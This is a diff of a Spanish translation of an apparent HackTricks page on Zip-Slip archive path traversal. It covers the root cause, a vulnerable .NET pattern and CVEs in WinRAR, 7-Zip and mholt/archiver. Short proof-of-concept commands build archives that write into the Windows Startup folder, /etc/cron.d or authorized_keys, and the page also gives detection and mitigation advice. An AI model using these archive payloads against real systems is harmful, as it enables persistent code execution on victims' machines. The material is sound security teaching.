@@ -4,23 +4,23 @@
 
 ## Descripción general
 
-Muchos formatos de archivo (ZIP, RAR, TAR, 7-ZIP, etc.) permiten que cada entrada lleve su propia **ruta interna**. Cuando una utilidad de extracción acata ciegamente esa ruta, un nombre de archivo manipulado que contenga `..` o una **ruta absoluta** (p. ej. `C:\Windows\System32\`) se escribirá fuera del directorio elegido por el usuario.
-Esta clase de vulnerabilidad es ampliamente conocida como *Zip-Slip* o **archive extraction path traversal**.
+Muchos formatos de archivo (ZIP, RAR, TAR, 7-ZIP, etc.) permiten que cada entrada incluya su propio **internal path**. Cuando una utilidad de extracción respeta ciegamente esa ruta, un nombre de archivo diseñado con `..` o una **absolute path** (por ejemplo, `C:\Windows\System32\`) se escribirá fuera del directorio elegido por el usuario.
+Esta clase de vulnerabilidad se conoce ampliamente como *Zip-Slip* o **archive extraction path traversal**.
 
-Las consecuencias van desde sobrescribir archivos arbitrarios hasta lograr directamente **remote code execution (RCE)** al dejar un payload en una ubicación de **auto-run** como la carpeta *Startup* de Windows.
+Las consecuencias van desde sobrescribir archivos arbitrarios hasta conseguir directamente **remote code execution (RCE)** colocando un payload en una ubicación de **auto-run**, como la carpeta *Startup* de Windows.
 
 ## Causa raíz
 
-1. El atacante crea un archivo en el que uno o más encabezados de archivo contienen:
-* Secuencias de recorrido relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+1. El atacante crea un archivo donde uno o más encabezados de archivo contienen:
+* Secuencias de traversal relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
 * Rutas absolutas (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-* O **symlinks** creados que se resuelven fuera del directorio objetivo (común en ZIP/TAR en *nix*).
-2. La víctima extrae el archivo con una herramienta vulnerable que confía en la ruta incrustada (o sigue los symlinks) en lugar de sanitizarla o forzar la extracción dentro del directorio elegido.
-3. El archivo se escribe en la ubicación controlada por el atacante y se ejecuta/carga la próxima vez que el sistema o el usuario active esa ruta.
+* O **symlinks** diseñados para resolverse fuera del directorio de destino (algo habitual en ZIP/TAR sobre sistemas *nix*).
+2. La víctima extrae el archivo con una herramienta vulnerable que confía en la ruta incluida (o sigue los symlinks) en lugar de sanitizarla o forzar la extracción dentro del directorio elegido.
+3. El archivo se escribe en la ubicación controlada por el atacante y se ejecuta/carga la próxima vez que el sistema o el usuario activa esa ruta.
 
-### .NET `Path.Combine` + `ZipArchive` traversal
+### Traversal mediante `.NET` `Path.Combine` + `ZipArchive`
 
-Un anti-patrón común en .NET es combinar el destino previsto con **controlada por el usuario** `ZipArchiveEntry.FullName` y extraer sin normalizar la ruta:
+Un anti-pattern habitual en .NET consiste en combinar el destino previsto con `ZipArchiveEntry.FullName`, controlado por el usuario, y extraerlo sin normalizar la ruta:<sup>[[4]](#references)</sup>
 ```csharp
 using (var zip = ZipFile.OpenRead(zipPath))
 {
@@ -31,92 +31,93 @@ entry.ExtractToFile(dest);
 }
 }
 ```
-- Si `entry.FullName` comienza con `..\\` se produce path traversal; si es un **absolute path**, el componente izquierdo se descarta por completo, dando lugar a un **arbitrary file write** como identidad de extracción.
-- Archivo de prueba de concepto para escribir en un directorio hermano `app` vigilado por un escáner programado:
+- Si `entry.FullName` comienza con `..\\`, realiza un traversal; si es una **ruta absoluta**, el componente de la izquierda se descarta por completo, lo que da como resultado una **escritura arbitraria de archivos** como identidad de extracción.
+- Archivo de prueba de concepto para escribir en un directorio `app` hermano supervisado por un scanner programado:
 ```python
 import zipfile
 with zipfile.ZipFile("slip.zip", "w") as z:
 z.writestr("../app/0xdf.txt", "ABCD")
 ```
-Colocar ese ZIP en el buzón monitoreado da como resultado `C:\samples\app\0xdf.txt`, confirmando traversal fuera de `C:\samples\queue\` y habilitando primitivas posteriores (p. ej., DLL hijacks).
+Depositar ese ZIP en la bandeja de entrada monitorizada da como resultado `C:\samples\app\0xdf.txt`, lo que demuestra el traversal fuera de `C:\samples\queue\` y permite primitivas posteriores (por ejemplo, DLL hijacks).
 
 ## Ejemplo del mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR para Windows (incluyendo la CLI `rar` / `unrar`, la DLL y el código fuente portable) no validaba los nombres de archivo durante la extracción.
-Un archivo RAR malicioso que contiene una entrada como:
+WinRAR para Windows (incluidos la CLI `rar` / `unrar`, la DLL y el código fuente portable) no validaba los nombres de archivo durante la extracción.
+Un archivo RAR malicioso que contenía una entrada como:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-terminaría **fuera** del directorio de salida seleccionado y dentro de la carpeta *Startup* del usuario. Al iniciar sesión, Windows ejecuta automáticamente todo lo que haya allí, proporcionando RCE *persistente*.
+terminaría **fuera** del directorio de salida seleccionado y dentro de la carpeta *Startup* del usuario. Después del inicio de sesión, Windows ejecuta automáticamente todo lo que esté allí, proporcionando RCE *persistente*.<sup>[[5]](#references)</sup>
 
-### Creación de un PoC Archive (Linux/Mac)
+### Creación de un archivo PoC (Linux/Mac)
 ```bash
 # Requires rar >= 6.x
 mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-Options used:
-* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).
+Opciones utilizadas:
+* `-ep`  – almacena las rutas de los archivos exactamente como se indican (no elimina los `./` iniciales).
 
-Entregar `evil.rar` a la víctima e indicarles que lo extraigan con una versión vulnerable de WinRAR.
+Entrega `evil.rar` a la víctima e indícale que lo extraiga con una versión vulnerable de WinRAR.
 
-### Observed Exploitation in the Wild
+### Explotación observada en la práctica
 
-ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.
+ESET informó sobre campañas de spear-phishing de RomCom (Storm-0978/UNC2596) que adjuntaban archivos RAR que abusaban de CVE-2025-8088 para desplegar backdoors personalizados y facilitar operaciones de ransomware.<sup>[[5]](#references)</sup>
 
-## Newer Cases (2024–2025)
+## Casos más recientes (2024–2025)
 
 ### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
-* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
-* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
-* **Quick PoC (Linux)**:
+* **Bug**: Las entradas ZIP que eran **symbolic links** se desreferenciaban durante la extracción, lo que permitía a los atacantes escapar del directorio de destino y sobrescribir rutas arbitrarias. La interacción del usuario se limita a *abrir/extraer* el archivo.<sup>[[1]](#references)</sup>
+* **Affected**: 7-Zip 21.02–24.09 (builds de Windows y Linux). Se corrigió en **25.00** (julio de 2025) y posteriores.
+* **Impacto**: Sobrescribir `Start Menu/Programs/Startup` o ubicaciones desde las que se ejecutan servicios → el código se ejecuta en el siguiente inicio de sesión o reinicio del servicio.
+* **PoC rápida (Linux)**:
 ```bash
 mkdir -p out
 ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.
+En una build parcheada, `/etc/cron.d` no se modificará; el symlink se extrae como un link dentro de `/tmp/target`.
 
 ### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
-* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
-* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
-* **Minimal reproduction**:
+* **Bug**: `archiver.Unarchive()` sigue las rutas `../` y las entradas ZIP que son symlinks, escribiendo fuera de `outputDir`.<sup>[[2]](#references)</sup>
+* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (el proyecto ahora está deprecated).
+* **Fix**: Cambia a `mholt/archives` ≥ 0.1.0 o implementa comprobaciones de rutas canónicas antes de escribir.
+* **Reproducción mínima**:
 ```go
 // go test . with archiver<=3.5.1
 archiver.Unarchive("exploit.zip", "/tmp/safe")
 // exploit.zip holds ../../../../home/user/.ssh/authorized_keys
 ```
 
-## Detection Tips
+## Consejos de detección
 
-* **Static inspection** – List archive entries and flag any name containing `../`, `..\\`, *absolute paths* (`/`, `C:`) or entries of type *symlink* whose target is outside the extraction dir.
-* **Canonicalisation** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
-* **Sandbox extraction** – Decompress into a disposable directory using a *safe* extractor (e.g., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) and verify resulting paths stay inside the directory.
-* **Endpoint monitoring** – Alert on new executables written to `Startup`/`Run`/`cron` locations shortly after an archive is opened by WinRAR/7-Zip/etc.
+* **Inspección estática** – Enumera las entradas del archivo y marca cualquier nombre que contenga `../`, `..\\`, *rutas absolutas* (`/`, `C:`) o entradas de tipo *symlink* cuyo destino esté fuera del directorio de extracción.
+* **Canonicalización** – Asegúrate de que `realpath(join(dest, name))` siga comenzando por `dest`. Recházalo en caso contrario.<sup>[[3]](#references)</sup>
+* **Extracción en sandbox** – Descomprime en un directorio desechable utilizando un extractor *seguro* (por ejemplo, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) y verifica que las rutas resultantes permanezcan dentro del directorio.
+* **Monitorización de endpoints** – Genera una alerta cuando se escriban nuevos ejecutables en ubicaciones `Startup`/`Run`/`cron` poco después de que WinRAR/7-Zip/etc. abra un archivo.
 
-## Mitigation & Hardening
+## Mitigación y hardening
 
-1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
-2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
-3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
-4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.
+1. **Actualiza el extractor** – WinRAR 7.13+ y 7-Zip 25.00+ implementan sanitización de rutas/symlinks. Ninguna de las dos herramientas tiene auto-update.
+2. Extrae los archivos con “**Do not extract paths**” / “**Ignore paths**” cuando sea posible.
+3. En Unix, elimina privilegios y monta un **chroot/namespace** antes de la extracción; en Windows, utiliza **AppContainer** o un sandbox.
+4. Si escribes código personalizado, normaliza con `realpath()`/`PathCanonicalize()` **antes** de crear/escribir, y rechaza cualquier entrada que escape del destino.
 
-## Additional Affected / Historical Cases
+## Casos adicionales afectados / históricos
 
-* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
-* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
-* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.
+* 2018 – Advisory masivo de *Zip-Slip* de Snyk que afectaba a numerosas librerías de Java/Go/JS.
+* 2023 – 7-Zip CVE-2023-4011, un traversal similar durante la combinación con `-ao`.
+* 2025 – `go-slug` de HashiCorp (CVE-2025-0377), traversal durante la extracción TAR en slugs (parche en v1.2).
+* Cualquier lógica de extracción personalizada que no llame a `PathCanonicalize` / `realpath` antes de escribir.
 
-## References
+## Referencias
 
-- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
-- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
-- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
-- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
+- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
+- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
+- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
 
 {{#include ../banners/hacktricks-training.md}}
